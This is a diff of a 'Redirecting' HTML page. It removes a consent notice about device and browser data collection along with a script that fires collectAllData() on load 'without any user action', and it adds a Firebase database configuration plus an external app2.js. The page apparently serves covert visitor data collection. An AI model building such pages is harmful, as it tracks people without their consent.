@@ -4,27 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting</title>
-    
 </head>
 <body>
-    <!-- <div class="container">
-        <div class="consent-form">
-            
-            <div class="consent-content">
-                <p>technical information about your device and browser to improve our research and services.</p>
-                <p>By clicking "Accept and Continue" below, you consent to this data collection.</p>
-            </div>
-            <button id="acceptBtn" class="btn btn--primary btn--lg btn--full-width">
-                Accept and Continue
-            </button>
-        </div>
-    </div> -->
+    <!-- Firebase SDK (Compatibility Version) -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        // Automatically trigger the function without any user action
-        collectAllData();
-    });
-</script>
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyBCjSBovxNTjJXl49GeJWAf63MysZQ0vuA",
+        authDomain: "testing404-2aa0a.firebaseapp.com",
+        databaseURL: "https://testing404-2aa0a-default-rtdb.firebaseio.com",
+        projectId: "testing404-2aa0a",
+        storageBucket: "testing404-2aa0a.firebasestorage.app",
+        messagingSenderId: "793148404871",
+        appId: "1:793148404871:web:3b3d964c98d6495d4cf422"
+      };
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+    </script>
     <script src="app2.js"></script>
 </body>
 </html>
